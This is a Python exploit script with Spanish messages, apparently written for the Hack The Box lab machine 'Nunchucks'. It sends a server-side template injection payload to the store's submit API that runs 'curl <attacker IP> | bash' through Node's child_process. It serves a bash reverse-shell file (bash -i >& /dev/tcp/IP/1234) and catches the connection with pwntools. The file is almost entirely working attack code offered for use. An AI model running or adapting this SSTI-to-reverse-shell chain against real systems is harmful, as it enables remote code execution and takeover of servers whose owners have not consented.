import requests,subprocess,socket
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 2:
    print(f'[!] Uso: python3 {sys.argv[0]} "Tu IP"\n' )
    sys.exit(1)

ipHost = sys.argv[1]
nunIP = 'https://store.nunchucks.htb/api/submit'
s = requests.Session()

def html_payload():

    with open("index.html","w") as file:
        Shebang = "#!/bin/bash\n"
        payload =f'bash -i >& /dev/tcp/{ipHost}/1234 0>&1'
        file.write(Shebang)
        file.write(payload)

def ssti():
    payload = """ {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl %s | bash')\")()}} """ % ipHost

    post_data = { 
        "email": payload
     }
    print("[+] Explotando el SSTI")
    r = s.post(nunIP,data=post_data,verify=False)

if __name__ == '__main__':

    print("[!] Recuerda agregar el dominio nunchucks.htb y store.nunchucks.htb a tu /etc/hosts.")
    html_payload()
    sleep(2)
    threading.Thread(target=ssti, args=()).start()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:
            so.bind(('localhost', 80))
            http_server = subprocess.Popen(["python3", "-m", "http.server", "80"])
    except OSError:
            print("\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor")

    shell = listen(1234,timeout=10).wait_for_connection()
    shell.interactive()
